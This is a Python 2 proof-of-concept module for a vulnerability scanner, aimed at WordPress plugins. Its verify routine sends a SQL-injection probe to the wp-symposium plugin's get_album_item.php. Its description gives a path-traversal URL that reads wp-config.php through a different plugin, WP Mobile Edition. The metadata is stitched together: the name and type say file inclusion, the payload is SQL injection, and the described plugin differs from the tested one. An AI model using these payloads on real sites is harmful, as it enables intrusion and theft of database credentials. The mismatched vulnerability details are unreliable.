# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'c86283ab-2985-48bb-8878-e10364c88a93'
    name = 'WordPress plugins/wp-symposium 本地文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2015-06-08'  # 漏洞公布时间
    desc = '''
        Wordpress Plugin 'WP Mobile Edition' is not filtering data so we can get the configration file in the path 
        < site.com/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php>
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/37244/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WP Mobile Edition Version 2.2.7 '  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '69326e54-9a7b-4e38-ad4d-57f5a3ec1569'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload='/wp-content/plugins/wp-symposium/get_album_item.php?size=md5(1);--'
            verify_url = self.target + payload
            #code, head, res, errcode, _ = curl.curl(url)
            r = requests.get(verify_url)
            if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.content:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
